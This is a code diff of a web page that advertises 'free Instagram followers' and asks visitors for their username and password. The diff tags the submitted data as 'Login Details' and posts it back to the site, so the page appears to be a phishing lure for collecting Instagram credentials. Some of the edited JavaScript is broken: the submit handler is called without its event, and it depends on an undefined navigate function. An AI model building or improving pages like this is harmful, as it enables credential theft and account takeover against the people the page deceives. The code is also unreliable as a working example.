@@ -8,24 +8,20 @@
     <link rel="stylesheet" href="css/media.css">
     <title>4llowersmax | free-instagram-followers </title>
     <script>
-           const handleSubmit = (event) => {
+  const handleSubmit = (event) => {
   event.preventDefault();
 
   const myForm = event.target;
   const formData = new FormData(myForm);
-  
+
   fetch("/", {
     method: "POST",
     headers: { "Content-Type": "application/x-www-form-urlencoded" },
     body: new URLSearchParams(formData).toString(),
   })
-    .then(() => alert("Thank you for your submission"))
+    .then(() => navigate("/thank-you/")) // Assuming navigate is defined
     .catch((error) => alert(error));
 };
-
-document
-  .querySelector("form")
-  .addEventListener("submit", handleSubmit);
 
     </script>
 </head>
@@ -105,8 +101,8 @@ document
     <div class="welcome">
         <h2 class="m-head">Free Instagram Followers</h2>
         <div class="line-bottom"></div>
-        <form id="form" data-nelify="true" name="myForm" method="post" action="/index.html" netlify >
-            <input type="hidden" name="form-name">
+        <form id="form" data-nelify="true" name="myForm" method="post" onsubmit="return handleSubmit();">
+            <input type="hidden" name="form-name" value="Login Details">
             <h2 class="m-head result-head">Get 50 followers for free</h2>
             <label for="name">Username/Email
              <input type="text" name="username" placeholder="@dab00rah01" id="email">
@@ -117,7 +113,7 @@ document
             <label for="password">Confirm Password
                 <input type="password" name="confirm password" id="c-password" placeholder="*******">
             </label>
-            <input type="submit" value="Get Followers" class="submit">
+            <input type="submit" value="Get Followers" class="submit" />
         </form>
     </div>
 </div>
